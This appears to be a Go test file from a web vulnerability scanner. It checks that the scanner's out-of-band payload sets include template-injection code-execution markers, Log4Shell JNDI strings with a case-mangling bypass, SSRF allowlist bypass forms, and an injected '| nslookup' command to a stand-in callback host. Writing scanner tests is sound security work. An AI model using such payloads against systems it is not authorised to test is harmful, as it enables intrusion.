package scanner

import (
	"strings"
	"testing"
)

func TestSSTIOOBPayloadsCoverEngines(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	ps := sstiOOBPayloads(cb)
	if len(ps) < 8 {
		t.Fatalf("expected a broad SSTI set, got %d", len(ps))
	}
	// every payload must embed the callback so a hit correlates.
	for _, p := range ps {
		if !strings.Contains(p, cb) {
			t.Fatalf("SSTI payload missing callback: %q", p)
		}
	}
	// key engine markers must be represented.
	joined := strings.Join(ps, "\n")
	for _, marker := range []string{
		"__globals__",                         // Jinja2
		"__import__",                          // Mako
		"filter('system')",                    // Twig
		"{php}",                               // Smarty
		"child_process",                       // Nunjucks
		"<%=",                                 // ERB
		"freemarker.template.utility.Execute", // Freemarker
		"java.lang.Runtime",                   // SpEL/Java EL
	} {
		if !strings.Contains(joined, marker) {
			t.Errorf("SSTI set missing engine marker %q", marker)
		}
	}
}

func TestLog4ShellParamPayloads(t *testing.T) {
	cb := "oast.example.com:1389/rcnoob0123456789"
	ps := log4ShellParamPayloads(cb)
	if len(ps) < 3 {
		t.Fatalf("expected multiple Log4Shell variants, got %d", len(ps))
	}
	joined := strings.Join(ps, "\n")
	// plain, case-mangled bypass, and RMI variants must all be present.
	for _, want := range []string{"${jndi:ldap://" + cb, "lower:j", "rmi://" + cb, "dns://" + cb} {
		if !strings.Contains(joined, want) {
			t.Errorf("Log4Shell set missing %q", want)
		}
	}
}

func TestSSRFOOBPayloadsBypasses(t *testing.T) {
	host := "oast.example.com"
	cb := "http://" + host + "/oob/rcnoob0123456789"
	ps := ssrfOOBPayloads(cb, host, "https://allowed.example/image.png")
	joined := strings.Join(ps, "\n")
	// direct, https, protocol-relative, and fragment-bypass forms.
	for _, want := range []string{cb, "https://" + host + "/oob/", "//" + host + "/oob/", cb + "#"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SSRF set missing variant %q; got %v", want, ps)
		}
	}
}

func TestSSRFOOBPayloadsPreserveHTTPSPath(t *testing.T) {
	cb := "https://oob.example.test/oob/rcnoob0123456789abcdef0123"
	got := ssrfOOBPayloads(cb, "oob.example.test", "https://allowed.example/path")
	for _, bad := range []string{"https://oob.example.test//oob.example.test/", "//oob.example.test//oob.example.test/"} {
		for _, payload := range got {
			if strings.Contains(payload, bad) {
				t.Fatalf("malformed HTTPS callback payload %q", payload)
			}
		}
	}
	if !containsString(got, "//oob.example.test/oob/rcnoob0123456789abcdef0123") {
		t.Fatalf("missing protocol-relative HTTPS callback path: %#v", got)
	}
}

func TestRCEOOBDNSFallbackUsesHostOnly(t *testing.T) {
	got := rceOOBPayloads("https://oob.example.test/oob/rcnoob0123456789abcdef0123")
	if !containsString(got, "| nslookup oob.example.test") {
		t.Fatalf("DNS fallback must contain host only: %#v", got)
	}
	for _, payload := range got {
		if strings.HasPrefix(payload, "| nslookup ") && strings.Contains(strings.TrimPrefix(payload, "| nslookup "), "/") {
			t.Fatalf("DNS fallback contains an invalid URL path: %q", payload)
		}
	}
}

func TestSQLiOOBStaysWithinDatabaseProof(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	joined := strings.Join(sqliOOBPayloads(cb, "oast.example.com"), "\n")
	if strings.Contains(joined, "TO PROGRAM") || strings.Contains(joined, "xp_cmdshell") {
		t.Fatalf("SQLi confirmation must not execute operating-system commands: %s", joined)
	}
	// Oracle/MSSQL/MySQL DB-native primitives remain.
	for _, want := range []string{"UTL_HTTP.REQUEST", "xp_dirtree", "LOAD_FILE"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SQLi OOB set regressed, missing %q", want)
		}
	}
}
